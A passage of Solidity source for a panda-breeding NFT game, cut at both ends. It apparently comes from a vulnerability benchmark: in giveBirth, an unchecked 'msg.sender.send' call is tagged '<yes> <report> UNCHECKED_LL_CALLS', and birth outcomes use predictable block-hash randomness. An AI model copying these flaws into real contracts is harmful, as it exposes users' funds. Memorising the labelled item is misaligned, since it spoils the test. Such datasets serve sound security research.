Emit the transfer event.\n        Transfer(_from, _to, _tokenId);\n    }\n\n    /// @dev An internal method that creates a new panda and stores it. This\n    ///  method doesn't do any checking and should only be called when the\n    ///  input data is known to be valid. Will generate both a Birth event\n    ///  and a Transfer event.\n    /// @param _matronId The panda ID of the matron of this cat (zero for gen0)\n    /// @param _sireId The panda ID of the sire of this cat (zero for gen0)\n    /// @param _generation The generation number of this cat, must be computed by caller.\n    /// @param _genes The panda's genetic code.\n    /// @param _owner The inital owner of this cat, must be non-zero (except for the unPanda, ID 0)\n    function _createPanda(\n        uint256 _matronId,\n        uint256 _sireId,\n        uint256 _generation,\n        uint256[2] _genes,\n        address _owner\n    )\n        internal\n        returns (uint)\n    {\n        // These requires are not strictly necessary, our calling code should make\n        // sure that these conditions are never broken. However! _createPanda() is already\n        // an expensive call (for storage), and it doesn't hurt to be especially careful\n        // to ensure our data structures are always valid.\n        require(_matronId == uint256(uint32(_matronId)));\n        require(_sireId == uint256(uint32(_sireId)));\n        require(_generation == uint256(uint16(_generation)));\n\n\n        // New panda starts with the same cooldown as parent gen/2\n        uint16 cooldownIndex = 0;\n        // when contract creation, geneScience ref is null \n        if (pandas.length>0){\n            uint16 pureDegree = uint16(geneScience.getPureFromGene(_genes));\n            if (pureDegree==0) {\n                pureDegree = 1;\n            }\n            cooldownIndex = 1000/pureDegree;\n            if (cooldownIndex%10 < 5){\n                cooldownIndex = cooldownIndex/10;\n            }else{\n                cooldownIndex = cooldownIndex/10 + 1;\n            }\n            cooldownIndex = cooldownIndex - 1;\n            if (cooldownIndex > 8) {\n                cooldownIndex = 8;\n            }\n            uint256 _tp = geneScience.getWizzType(_genes);\n            if (_tp>0 && wizzPandaQuota[_tp]<=wizzPandaCount[_tp]) {\n                _genes = geneScience.clearWizzType(_genes);\n                _tp = 0;\n            }\n            // gensis panda cooldownIndex should be 24 hours\n            if (_tp == 1){\n                cooldownIndex = 5;\n            }\n\n            // increase wizz counter\n            if (_tp>0){\n                wizzPandaCount[_tp] = wizzPandaCount[_tp] + 1;\n            }\n            // all gen0&gen1 except gensis\n            if (_generation <= 1 && _tp != 1){\n                require(gen0CreatedCount<GEN0_TOTAL_COUNT);\n                gen0CreatedCount++;\n            }\n        }\n\n        Panda memory _panda = Panda({\n            genes: _genes,\n            birthTime: uint64(now),\n            cooldownEndBlock: 0,\n            matronId: uint32(_matronId),\n            sireId: uint32(_sireId),\n            siringWithId: 0,\n            cooldownIndex: cooldownIndex,\n            generation: uint16(_generation)\n        });\n        uint256 newKittenId = pandas.push(_panda) - 1;\n\n        // It's probably never going to happen, 4 billion cats is A LOT, but\n        // let's just be 100% sure we never let this happen.\n        require(newKittenId == uint256(uint32(newKittenId)));\n\n        // emit the birth event\n        Birth(\n            _owner,\n            newKittenId,\n            uint256(_panda.matronId),\n            uint256(_panda.sireId),\n            _panda.genes\n        );\n\n        // This will assign ownership, and also emit the Transfer event as\n        // per ERC721 draft\n        _transfer(0, _owner, newKittenId);\n        \n        return newKittenId;\n    }\n\n    // Any C-level can fix how many seconds per blocks are currently observed.\n    function setSecondsPerBlock(uint256 secs) external onlyCLevel {\n        require(secs < cooldowns[0]);\n        secondsPerBlock = secs;\n    }\n}\n/// @title The external contract that is responsible for generating metadata for the pandas,\n///  it has one function that will return the data as bytes.\ncontract ERC721Metadata {\n    /// @dev Given a token Id, returns a byte array that is supposed to be converted into string.\n    function getMetadata(uint256 _tokenId, string) public view returns (bytes32[4] buffer, uint256 count) {\n        if (_tokenId == 1) {\n            buffer[0] = \"Hello World! :D\";\n            count = 15;\n        } else if (_tokenId == 2) {\n            buffer[0] = \"I would definitely choose a medi\";\n            buffer[1] = \"um length string.\";\n            count = 49;\n        } else if (_tokenId == 3) {\n            buffer[0] = \"Lorem ipsum dolor sit amet, mi e\";\n            buffer[1] = \"st accumsan dapibus augue lorem,\";\n            buffer[2] = \" tristique vestibulum id, libero\";\n            buffer[3] = \" suscipit varius sapien aliquam.\";\n            count = 128;\n        }\n    }\n}\n\n\n\n\n\n\n\n/// @title The facet of the CryptoPandas core contract that manages ownership, ERC-721 (draft) compliant.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev Ref: https://github.com/ethereum/EIPs/issues/721\n///  See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaOwnership is PandaBase, ERC721 {\n\n    /// @notice Name and symbol of the non fungible token, as defined in ERC721.\n    string public constant name = \"PandaEarth\";\n    string public constant symbol = \"PE\";\n\n    bytes4 constant InterfaceSignature_ERC165 =\n        bytes4(keccak256('supportsInterface(bytes4)'));\n\n    bytes4 constant InterfaceSignature_ERC721 =\n        bytes4(keccak256('name()')) ^\n        bytes4(keccak256('symbol()')) ^\n        bytes4(keccak256('totalSupply()')) ^\n        bytes4(keccak256('balanceOf(address)')) ^\n        bytes4(keccak256('ownerOf(uint256)')) ^\n        bytes4(keccak256('approve(address,uint256)')) ^\n        bytes4(keccak256('transfer(address,uint256)')) ^\n        bytes4(keccak256('transferFrom(address,address,uint256)')) ^\n        bytes4(keccak256('tokensOfOwner(address)')) ^\n        bytes4(keccak256('tokenMetadata(uint256,string)'));\n\n    /// @notice Introspection interface as per ERC-165 (https://github.com/ethereum/EIPs/issues/165).\n    ///  Returns true for any standardized interfaces implemented by this contract. We implement\n    ///  ERC-165 (obviously!) and ERC-721.\n    function supportsInterface(bytes4 _interfaceID) external view returns (bool)\n    {\n        // DEBUG ONLY\n        //require((InterfaceSignature_ERC165 == 0x01ffc9a7) && (InterfaceSignature_ERC721 == 0x9a20483d));\n\n        return ((_interfaceID == InterfaceSignature_ERC165) || (_interfaceID == InterfaceSignature_ERC721));\n    }\n\n    // Internal utility functions: These functions all assume that their input arguments\n    // are valid. We leave it to public methods to sanitize their inputs and follow\n    // the required logic.\n\n    /// @dev Checks if a given address is the current owner of a particular Panda.\n    /// @param _claimant the address we are validating against.\n    /// @param _tokenId kitten id, only valid when > 0\n    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {\n        return pandaIndexToOwner[_tokenId] == _claimant;\n    }\n\n    /// @dev Checks if a given address currently has transferApproval for a particular Panda.\n    /// @param _claimant the address we are confirming kitten is approved for.\n    /// @param _tokenId kitten id, only valid when > 0\n    function _approvedFor(address _claimant, uint256 _tokenId) internal view returns (bool) {\n        return pandaIndexToApproved[_tokenId] == _claimant;\n    }\n\n    /// @dev Marks an address as being approved for transferFrom(), overwriting any previous\n    ///  approval. Setting _approved to address(0) clears all transfer approval.\n    ///  NOTE: _approve() does NOT send the Approval event. This is intentional because\n    ///  _approve() and transferFrom() are used together for putting Pandas on auction, and\n    ///  there is no value in spamming the log with Approval events in that case.\n    function _approve(uint256 _tokenId, address _approved) internal {\n        pandaIndexToApproved[_tokenId] = _approved;\n    }\n\n    /// @notice Returns the number of Pandas owned by a specific address.\n    /// @param _owner The owner address to check.\n    /// @dev Required for ERC-721 compliance\n    function balanceOf(address _owner) public view returns (uint256 count) {\n        return ownershipTokenCount[_owner];\n    }\n\n    /// @notice Transfers a Panda to another address. If transferring to a smart\n    ///  contract be VERY CAREFUL to ensure that it is aware of ERC-721 (or\n    ///  CryptoPandas specifically) or your Panda may be lost forever. Seriously.\n    /// @param _to The address of the recipient, can be a user or contract.\n    /// @param _tokenId The ID of the Panda to transfer.\n    /// @dev Required for ERC-721 compliance.\n    function transfer(\n        address _to,\n        uint256 _tokenId\n    )\n        external\n        whenNotPaused\n    {\n        // Safety check to prevent against an unexpected 0x0 default.\n        require(_to != address(0));\n        // Disallow transfers to this contract to prevent accidental misuse.\n        // The contract should never own any pandas (except very briefly\n        // after a gen0 cat is created and before it goes on auction).\n        require(_to != address(this));\n        // Disallow transfers to the auction contracts to prevent accidental\n        // misuse. Auction contracts should only take ownership of pandas\n        // through the allow + transferFrom flow.\n        require(_to != address(saleAuction));\n        require(_to != address(siringAuction));\n\n        // You can only send your own cat.\n        require(_owns(msg.sender, _tokenId));\n\n        // Reassign ownership, clear pending approvals, emit Transfer event.\n        _transfer(msg.sender, _to, _tokenId);\n    }\n\n    /// @notice Grant another address the right to transfer a specific Panda via\n    ///  transferFrom(). This is the preferred flow for transfering NFTs to contracts.\n    /// @param _to The address to be granted transfer approval. Pass address(0) to\n    ///  clear all approvals.\n    /// @param _tokenId The ID of the Panda that can be transferred if this call succeeds.\n    /// @dev Required for ERC-721 compliance.\n    function approve(\n        address _to,\n        uint256 _tokenId\n    )\n        external\n        whenNotPaused\n    {\n        // Only an owner can grant transfer approval.\n        require(_owns(msg.sender, _tokenId));\n\n        // Register the approval (replacing any previous approval).\n        _approve(_tokenId, _to);\n\n        // Emit approval event.\n        Approval(msg.sender, _to, _tokenId);\n    }\n\n    /// @notice Transfer a Panda owned by another address, for which the calling address\n    ///  has previously been granted transfer approval by the owner.\n    /// @param _from The address that owns the Panda to be transfered.\n    /// @param _to The address that should take ownership of the Panda. Can be any address,\n    ///  including the caller.\n    /// @param _tokenId The ID of the Panda to be transferred.\n    /// @dev Required for ERC-721 compliance.\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    )\n        external\n        whenNotPaused\n    {\n        // Safety check to prevent against an unexpected 0x0 default.\n        require(_to != address(0));\n        // Disallow transfers to this contract to prevent accidental misuse.\n        // The contract should never own any pandas (except very briefly\n        // after a gen0 cat is created and before it goes on auction).\n        require(_to != address(this));\n        // Check for approval and valid ownership\n        require(_approvedFor(msg.sender, _tokenId));\n        require(_owns(_from, _tokenId));\n\n        // Reassign ownership (also clears pending approvals and emits Transfer event).\n        _transfer(_from, _to, _tokenId);\n    }\n\n    /// @notice Returns the total number of Pandas currently in existence.\n    /// @dev Required for ERC-721 compliance.\n    function totalSupply() public view returns (uint) {\n        return pandas.length - 1;\n    }\n\n    /// @notice Returns the address currently assigned ownership of a given Panda.\n    /// @dev Required for ERC-721 compliance.\n    function ownerOf(uint256 _tokenId)\n        external\n        view\n        returns (address owner)\n    {\n        owner = pandaIndexToOwner[_tokenId];\n\n        require(owner != address(0));\n    }\n\n    /// @notice Returns a list of all Panda IDs assigned to an address.\n    /// @param _owner The owner whose Pandas we are interested in.\n    /// @dev This method MUST NEVER be called by smart contract code. First, it's fairly\n    ///  expensive (it walks the entire Panda array looking for cats belonging to owner),\n    ///  but it also returns a dynamic array, which is only supported for web3 calls, and\n    ///  not contract-to-contract calls.\n    function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {\n        uint256 tokenCount = balanceOf(_owner);\n\n        if (tokenCount == 0) {\n            // Return an empty array\n            return new uint256[](0);\n        } else {\n            uint256[] memory result = new uint256[](tokenCount);\n            uint256 totalCats = totalSupply();\n            uint256 resultIndex = 0;\n\n            // We count on the fact that all cats have IDs starting at 1 and increasing\n            // sequentially up to the totalCat count.\n            uint256 catId;\n\n            for (catId = 1; catId <= totalCats; catId++) {\n                if (pandaIndexToOwner[catId] == _owner) {\n                    result[resultIndex] = catId;\n                    resultIndex++;\n                }\n            }\n\n            return result;\n        }\n    }\n\n    /// @dev Adapted from memcpy() by @arachnid (Nick Johnson <arachnid@notdot.net>)\n    ///  This method is licenced under the Apache License.\n    ///  Ref: https://github.com/Arachnid/solidity-stringutils/blob/2f6ca9accb48ae14c66f1437ec50ed19a0616f78/strings.sol\n    function _memcpy(uint _dest, uint _src, uint _len) private view {\n        // Copy word-length chunks while possible\n        for(; _len >= 32; _len -= 32) {\n            assembly {\n                mstore(_dest, mload(_src))\n            }\n            _dest += 32;\n            _src += 32;\n        }\n\n        // Copy remaining bytes\n        uint256 mask = 256 ** (32 - _len) - 1;\n        assembly {\n            let srcpart := and(mload(_src), not(mask))\n            let destpart := and(mload(_dest), mask)\n            mstore(_dest, or(destpart, srcpart))\n        }\n    }\n\n    /// @dev Adapted from toString(slice) by @arachnid (Nick Johnson <arachnid@notdot.net>)\n    ///  This method is licenced under the Apache License.\n    ///  Ref: https://github.com/Arachnid/solidity-stringutils/blob/2f6ca9accb48ae14c66f1437ec50ed19a0616f78/strings.sol\n    function _toString(bytes32[4] _rawBytes, uint256 _stringLength) private view returns (string) {\n        var outputString = new string(_stringLength);\n        uint256 outputPtr;\n        uint256 bytesPtr;\n\n        assembly {\n            outputPtr := add(outputString, 32)\n            bytesPtr := _rawBytes\n        }\n\n        _memcpy(outputPtr, bytesPtr, _stringLength);\n\n        return outputString;\n    }\n\n}\n\n\n\n\n/// @title A facet of PandaCore that manages Panda siring, gestation, and birth.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaBreeding is PandaOwnership {\n\n    uint256 public constant GENSIS_TOTAL_COUNT = 100;\n\n    /// @dev The Pregnant event is fired when two cats successfully breed and the pregnancy\n    ///  timer begins for the matron.\n    event Pregnant(address owner, uint256 matronId, uint256 sireId, uint256 cooldownEndBlock);\n    /// @dev The Abortion event is fired when two cats breed failed.\n    event Abortion(address owner, uint256 matronId, uint256 sireId);\n\n    /// @notice The minimum payment required to use breedWithAuto(). This fee goes towards\n    ///  the gas cost paid by whatever calls giveBirth(), and can be dynamically updated by\n    ///  the COO role as the gas price changes.\n    uint256 public autoBirthFee = 2 finney;\n\n    // Keeps track of number of pregnant pandas.\n    uint256 public pregnantPandas;\n\n    mapping(uint256 => address) childOwner;\n\n\n    /// @dev Update the address of the genetic contract, can only be called by the CEO.\n    /// @param _address An address of a GeneScience contract instance to be used from this point forward.\n    function setGeneScienceAddress(address _address) external onlyCEO {\n        GeneScienceInterface candidateContract = GeneScienceInterface(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isGeneScience());\n\n        // Set the new contract address\n        geneScience = candidateContract;\n    }\n\n    /// @dev Checks that a given kitten is able to breed. Requires that the\n    ///  current cooldown is finished (for sires) and also checks that there is\n    ///  no pending pregnancy.\n    function _isReadyToBreed(Panda _kit) internal view returns(bool) {\n        // In addition to checking the cooldownEndBlock, we also need to check to see if\n        // the cat has a pending birth; there can be some period of time between the end\n        // of the pregnacy timer and the birth event.\n        return (_kit.siringWithId == 0) && (_kit.cooldownEndBlock <= uint64(block.number));\n    }\n\n    /// @dev Check if a sire has authorized breeding with this matron. True if both sire\n    ///  and matron have the same owner, or if the sire has given siring permission to\n    ///  the matron's owner (via approveSiring()).\n    function _isSiringPermitted(uint256 _sireId, uint256 _matronId) internal view returns(bool) {\n        address matronOwner = pandaIndexToOwner[_matronId];\n        address sireOwner = pandaIndexToOwner[_sireId];\n\n        // Siring is okay if they have same owner, or if the matron's owner was given\n        // permission to breed with this sire.\n        return (matronOwner == sireOwner || sireAllowedToAddress[_sireId] == matronOwner);\n    }\n\n    /// @dev Set the cooldownEndTime for the given Panda, based on its current cooldownIndex.\n    ///  Also increments the cooldownIndex (unless it has hit the cap).\n    /// @param _kitten A reference to the Panda in storage which needs its timer started.\n    function _triggerCooldown(Panda storage _kitten) internal {\n        // Compute an estimation of the cooldown time in blocks (based on current cooldownIndex).\n        _kitten.cooldownEndBlock = uint64((cooldowns[_kitten.cooldownIndex] / secondsPerBlock) + block.number);\n\n\n        // Increment the breeding count, clamping it at 13, which is the length of the\n        // cooldowns array. We could check the array size dynamically, but hard-coding\n        // this as a constant saves gas. Yay, Solidity!\n        if (_kitten.cooldownIndex < 8 && geneScience.getWizzType(_kitten.genes) != 1) {\n            _kitten.cooldownIndex += 1;\n        }\n    }\n\n    /// @notice Grants approval to another user to sire with one of your Pandas.\n    /// @param _addr The address that will be able to sire with your Panda. Set to\n    ///  address(0) to clear all siring approvals for this Panda.\n    /// @param _sireId A Panda that you own that _addr will now be able to sire with.\n    function approveSiring(address _addr, uint256 _sireId)\n    external\n    whenNotPaused {\n        require(_owns(msg.sender, _sireId));\n        sireAllowedToAddress[_sireId] = _addr;\n    }\n\n    /// @dev Updates the minimum payment required for calling giveBirthAuto(). Can only\n    ///  be called by the COO address. (This fee is used to offset the gas cost incurred\n    ///  by the autobirth daemon).\n    function setAutoBirthFee(uint256 val) external onlyCOO {\n        autoBirthFee = val;\n    }\n\n    /// @dev Checks to see if a given Panda is pregnant and (if so) if the gestation\n    ///  period has passed.\n    function _isReadyToGiveBirth(Panda _matron) private view returns(bool) {\n        return (_matron.siringWithId != 0) && (_matron.cooldownEndBlock <= uint64(block.number));\n    }\n\n    /// @notice Checks that a given kitten is able to breed (i.e. it is not pregnant or\n    ///  in the middle of a siring cooldown).\n    /// @param _pandaId reference the id of the kitten, any user can inquire about it\n    function isReadyToBreed(uint256 _pandaId)\n    public\n    view\n    returns(bool) {\n        require(_pandaId > 0);\n        Panda storage kit = pandas[_pandaId];\n        return _isReadyToBreed(kit);\n    }\n\n    /// @dev Checks whether a panda is currently pregnant.\n    /// @param _pandaId reference the id of the kitten, any user can inquire about it\n    function isPregnant(uint256 _pandaId)\n    public\n    view\n    returns(bool) {\n        require(_pandaId > 0);\n        // A panda is pregnant if and only if this field is set\n        return pandas[_pandaId].siringWithId != 0;\n    }\n\n    /// @dev Internal check to see if a given sire and matron are a valid mating pair. DOES NOT\n    ///  check ownership permissions (that is up to the caller).\n    /// @param _matron A reference to the Panda struct of the potential matron.\n    /// @param _matronId The matron's ID.\n    /// @param _sire A reference to the Panda struct of the potential sire.\n    /// @param _sireId The sire's ID\n    function _isValidMatingPair(\n        Panda storage _matron,\n        uint256 _matronId,\n        Panda storage _sire,\n        uint256 _sireId\n    )\n    private\n    view\n    returns(bool) {\n        // A Panda can't breed with itself!\n        if (_matronId == _sireId) {\n            return false;\n        }\n\n        // Pandas can't breed with their parents.\n        if (_matron.matronId == _sireId || _matron.sireId == _sireId) {\n            return false;\n        }\n        if (_sire.matronId == _matronId || _sire.sireId == _matronId) {\n            return false;\n        }\n\n        // We can short circuit the sibling check (below) if either cat is\n        // gen zero (has a matron ID of zero).\n        if (_sire.matronId == 0 || _matron.matronId == 0) {\n            return true;\n        }\n\n        // Pandas can't breed with full or half siblings.\n        if (_sire.matronId == _matron.matronId || _sire.matronId == _matron.sireId) {\n            return false;\n        }\n        if (_sire.sireId == _matron.matronId || _sire.sireId == _matron.sireId) {\n            return false;\n        }\n\n        // male should get breed with female\n        if (geneScience.getSex(_matron.genes) + geneScience.getSex(_sire.genes) != 1) {\n            return false;\n        }\n\n        // Everything seems cool! Let's get DTF.\n        return true;\n    }\n\n    /// @dev Internal check to see if a given sire and matron are a valid mating pair for\n    ///  breeding via auction (i.e. skips ownership and siring approval checks).\n    function _canBreedWithViaAuction(uint256 _matronId, uint256 _sireId)\n    internal\n    view\n    returns(bool) {\n        Panda storage matron = pandas[_matronId];\n        Panda storage sire = pandas[_sireId];\n        return _isValidMatingPair(matron, _matronId, sire, _sireId);\n    }\n\n    /// @notice Checks to see if two cats can breed together, including checks for\n    ///  ownership and siring approvals. Does NOT check that both cats are ready for\n    ///  breeding (i.e. breedWith could still fail until the cooldowns are finished).\n    ///  TODO: Shouldn't this check pregnancy and cooldowns?!?\n    /// @param _matronId The ID of the proposed matron.\n    /// @param _sireId The ID of the proposed sire.\n    function canBreedWith(uint256 _matronId, uint256 _sireId)\n    external\n    view\n    returns(bool) {\n        require(_matronId > 0);\n        require(_sireId > 0);\n        Panda storage matron = pandas[_matronId];\n        Panda storage sire = pandas[_sireId];\n        return _isValidMatingPair(matron, _matronId, sire, _sireId) &&\n            _isSiringPermitted(_sireId, _matronId);\n    }\n\n    function _exchangeMatronSireId(uint256 _matronId, uint256 _sireId) internal returns(uint256, uint256) {\n        if (geneScience.getSex(pandas[_matronId].genes) == 1) {\n            return (_sireId, _matronId);\n        } else {\n            return (_matronId, _sireId);\n        }\n    }\n\n    /// @dev Internal utility function to initiate breeding, assumes that all breeding\n    ///  requirements have been checked.\n    function _breedWith(uint256 _matronId, uint256 _sireId, address _owner) internal {\n        // make id point real gender\n        (_matronId, _sireId) = _exchangeMatronSireId(_matronId, _sireId);\n        // Grab a reference to the Pandas from storage.\n        Panda storage sire = pandas[_sireId];\n        Panda storage matron = pandas[_matronId];\n\n        // Mark the matron as pregnant, keeping track of who the sire is.\n        matron.siringWithId = uint32(_sireId);\n\n        // Trigger the cooldown for both parents.\n        _triggerCooldown(sire);\n        _triggerCooldown(matron);\n\n        // Clear siring permission for both parents. This may not be strictly necessary\n        // but it's likely to avoid confusion!\n        delete sireAllowedToAddress[_matronId];\n        delete sireAllowedToAddress[_sireId];\n\n        // Every time a panda gets pregnant, counter is incremented.\n        pregnantPandas++;\n\n        childOwner[_matronId] = _owner;\n\n        // Emit the pregnancy event.\n        Pregnant(pandaIndexToOwner[_matronId], _matronId, _sireId, matron.cooldownEndBlock);\n    }\n\n    /// @notice Breed a Panda you own (as matron) with a sire that you own, or for which you\n    ///  have previously been given Siring approval. Will either make your cat pregnant, or will\n    ///  fail entirely. Requires a pre-payment of the fee given out to the first caller of giveBirth()\n    /// @param _matronId The ID of the Panda acting as matron (will end up pregnant if successful)\n    /// @param _sireId The ID of the Panda acting as sire (will begin its siring cooldown if successful)\n    function breedWithAuto(uint256 _matronId, uint256 _sireId)\n    external\n    payable\n    whenNotPaused {\n        // Checks for payment.\n        require(msg.value >= autoBirthFee);\n\n        // Caller must own the matron.\n        require(_owns(msg.sender, _matronId));\n\n        // Neither sire nor matron are allowed to be on auction during a normal\n        // breeding operation, but we don't need to check that explicitly.\n        // For matron: The caller of this function can't be the owner of the matron\n        //   because the owner of a Panda on auction is the auction house, and the\n        //   auction house will never call breedWith().\n        // For sire: Similarly, a sire on auction will be owned by the auction house\n        //   and the act of transferring ownership will have cleared any oustanding\n        //   siring approval.\n        // Thus we don't need to spend gas explicitly checking to see if either cat\n        // is on auction.\n\n        // Check that matron and sire are both owned by caller, or that the sire\n        // has given siring permission to caller (i.e. matron's owner).\n        // Will fail for _sireId = 0\n        require(_isSiringPermitted(_sireId, _matronId));\n\n        // Grab a reference to the potential matron\n        Panda storage matron = pandas[_matronId];\n\n        // Make sure matron isn't pregnant, or in the middle of a siring cooldown\n        require(_isReadyToBreed(matron));\n\n        // Grab a reference to the potential sire\n        Panda storage sire = pandas[_sireId];\n\n        // Make sure sire isn't pregnant, or in the middle of a siring cooldown\n        require(_isReadyToBreed(sire));\n\n        // Test that these cats are a valid mating pair.\n        require(_isValidMatingPair(\n            matron,\n            _matronId,\n            sire,\n            _sireId\n        ));\n\n        // All checks passed, panda gets pregnant!\n        _breedWith(_matronId, _sireId, msg.sender);\n    }\n\n    /// @notice Have a pregnant Panda give birth!\n    /// @param _matronId A Panda ready to give birth.\n    /// @return The Panda ID of the new kitten.\n    /// @dev Looks at a given Panda and, if pregnant and if the gestation period has passed,\n    ///  combines the genes of the two parents to create a new kitten. The new Panda is assigned\n    ///  to the current owner of the matron. Upon successful completion, both the matron and the\n    ///  new kitten will be ready to breed again. Note that anyone can call this function (if they\n    ///  are willing to pay the gas!), but the new kitten always goes to the mother's owner.\n    function giveBirth(uint256 _matronId, uint256[2] _childGenes, uint256[2] _factors)\n    external\n    whenNotPaused\n    onlyCLevel\n    returns(uint256) {\n        // Grab a reference to the matron in storage.\n        Panda storage matron = pandas[_matronId];\n\n        // Check that the matron is a valid cat.\n        require(matron.birthTime != 0);\n\n        // Check that the matron is pregnant, and that its time has come!\n        require(_isReadyToGiveBirth(matron));\n\n        // Grab a reference to the sire in storage.\n        uint256 sireId = matron.siringWithId;\n        Panda storage sire = pandas[sireId];\n\n        // Determine the higher generation number of the two parents\n        uint16 parentGen = matron.generation;\n        if (sire.generation > matron.generation) {\n            parentGen = sire.generation;\n        }\n\n        // Call the sooper-sekret gene mixing operation.\n        //uint256[2] memory childGenes = geneScience.mixGenes(matron.genes, sire.genes,matron.generation,sire.generation, matron.cooldownEndBlock - 1);\n        uint256[2] memory childGenes = _childGenes;\n\n        uint256 kittenId = 0;\n\n        // birth failed\n        uint256 probability = (geneScience.getPureFromGene(matron.genes) + geneScience.getPureFromGene(sire.genes)) / 2 + _factors[0];\n        if (probability >= (parentGen + 1) * _factors[1]) {\n            probability = probability - (parentGen + 1) * _factors[1];\n        } else {\n            probability = 0;\n        }\n        if (parentGen == 0 && gen0CreatedCount == GEN0_TOTAL_COUNT) {\n            probability = 0;\n        }\n        if (uint256(keccak256(block.blockhash(block.number - 2), now)) % 100 < probability) {\n            // Make the new kitten!\n            address owner = childOwner[_matronId];\n            kittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);\n        } else {\n            Abortion(pandaIndexToOwner[_matronId], _matronId, sireId);\n        }\n        // Make the new kitten!\n        //address owner = pandaIndexToOwner[_matronId];\n        //address owner = childOwner[_matronId];\n        //uint256 kittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);\n\n        // Clear the reference to sire from the matron (REQUIRED! Having siringWithId\n        // set is what marks a matron as being pregnant.)\n        delete matron.siringWithId;\n\n        // Every time a panda gives birth counter is decremented.\n        pregnantPandas--;\n\n        // Send the balance fee to the person who made birth happen.\n         // <yes> <report> UNCHECKED_LL_CALLS\n        msg.sender.send(autoBirthFee);\n\n        delete childOwner[_matronId];\n\n        // return the new kitten's ID\n        return kittenId;\n    }\n}\n\n\n\n\n\n/// @title Auction Core\n/// @dev Contains models, variables, and internal methods for the auction.\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract ClockAuctionBase {\n\n    // Represents an auction on an NFT\n    struct Auction {\n        // Current owner of NFT\n        address seller;\n        // Price (in wei) at beginning of auction\n        uint128 startingPrice;\n        // Price (in wei) at end of auction\n        uint128 endingPrice;\n        // Duration (in seconds) of auction\n        uint64 duration;\n        // Time when auction started\n        // NOTE: 0 if this auction has been concluded\n        uint64 startedAt;\n        // is this auction for gen0 panda\n        uint64 isGen0;\n    }\n\n    // Reference to contract tracking NFT ownership\n    ERC721 public nonFungibleContract;\n\n    // Cut owner takes on each auction, measured in basis points (1/100 of a percent).\n    // Values 0-10,000 map to 0%-100%\n    uint256 public ownerCut;\n\n    // Map from token ID to their corresponding auction.\n    mapping (uint256 => Auction) tokenIdToAuction;\n\n    event AuctionCreated(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration);\n    event AuctionSuccessful(uint256 tokenId, uint256 totalPrice, address winner);\n    event AuctionCancelled(uint256 tokenId);\n\n    /// @dev Returns true if the claimant owns the token.\n    /// @param _claimant - Address claiming to own the token.\n    /// @param _tokenId - ID of token whose ownership to verify.\n    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {\n        return (nonFungibleContract.ownerOf(_tokenId) == _claimant);\n    }\n\n    /// @dev Escrows the NFT, assigning ownership to this contract.\n    /// Throws if the escrow fails.\n    /// @param _owner - Current owner address of token to escrow.\n    /// @param _tokenId - ID of token whose approval to verify.\n    function _escrow(address _owner, uint256 _tokenId) internal {\n        // it will throw if transfer fails\n        nonFungibleContract.transferFrom(_owner, this, _tokenId);\n    }\n\n    /// @dev Transfers an NFT owned by this contract to another address.\n    /// Returns true if the transfer succeeds.\n    /// @param _receiver - Address to transfer NFT to.\n    /// @param _tokenId - ID of token to transfer.\n    function _transfer(address _receiver, uint256 _tokenId) internal {\n        // it will throw if transfer fails\n        nonFungibleContract.transfer(_receiver, _tokenId);\n    }\n\n    /// @dev Adds an auction to the list of open auctions. Also fires the\n    ///  AuctionCreated event.\n    /// @param _tokenId The ID of the token to be put on auction.\n    /// @param _auction Auction to add.\n    function _addAuction(uint256 _tokenId, Auction _auction) internal {\n        // Require that all auctions have a duration of\n        // at least one minute. (Keeps our math from getting hairy!)\n        require(_auction.duration >= 1 minutes);\n\n        tokenIdToAuction[_tokenId] = _auction;\n\n        AuctionCreated(\n            uint256(_tokenId),\n            uint256(_auction.startingPrice),\n            uint256(_auction.endingPrice),\n            uint256(_auction.duration)\n        );\n    } \n\n    /// @dev Cancels an auction unconditionally.\n    function _cancelAuction(uint256 _tokenId, address _seller) internal {\n        _removeAuction(_tokenId);\n        _transfer(_seller, _tokenId);\n        AuctionCancelled(_tokenId);\n    }\n\n    /// @dev Computes the price and transfers winnings.\n    /// Does NOT transfer ownership of token.\n    function _bid(uint256 _tokenId, uint256 _bidAmount)\n        internal\n        returns (uint256)\n    {\n        // Get a reference to the auction struct\n        Auction storage auction = tokenIdToAuction[_tokenId];\n\n        // Explicitly check that this auction is currently live.\n        // (Because of how Ethereum mappings work, we can't just count\n        // on the lookup above failing. An invalid _tokenId will just\n        // return an auction object that is all zeros.)\n        require(_isOnAuction(auction));\n\n        // Check that the bid is greater than or equal to the current price\n        uint256 price = _currentPrice(auction);\n        require(_bidAmount >= price);\n\n        // Grab a reference to the seller before the auction struct\n        // gets deleted.\n        address seller = auction.seller;\n\n        // The bid is good! Remove the auction before sending the fees\n        // to the sender so we can't have a reentrancy attack.\n        _removeAuction(_tokenId);\n\n        // Transfer proceeds to seller (if there are any!)\n        if (price > 0) {\n            // Calculate the auctioneer's cut.\n            // (NOTE: _computeCut() is guaranteed to return a\n            // value <= price, so this subtraction can't go negative.)\n            uint256 auctioneerCut = _computeCut(price);\n            uint256 sellerProceeds = price - auctioneerCut;\n\n            // NOTE: Doing a transfer() in the middle of a complex\n            // method like this is generally discouraged because of\n            // reentrancy attacks and DoS attacks if the seller is\n            // a contract with an invalid fallback function. We explicitly\n            // guard against reentrancy attacks by removing the auction\n            // before calling transfer(), and the only thing the seller\n            // can DoS is the sale of their own asset! (And if it's an\n            // accident, they can call cancelAuction(). )\n            seller.transfer(sellerProceeds);\n        }\n\n        // Calculate any excess funds included with the bid. If the excess\n        // is anything worth worrying about, transfer it back to bidder.\n        // NOTE: We checked above that the bid amount is greater than or\n        // equal to the price so this cannot underflow.\n        uint256 bidExcess = _bidAmount - 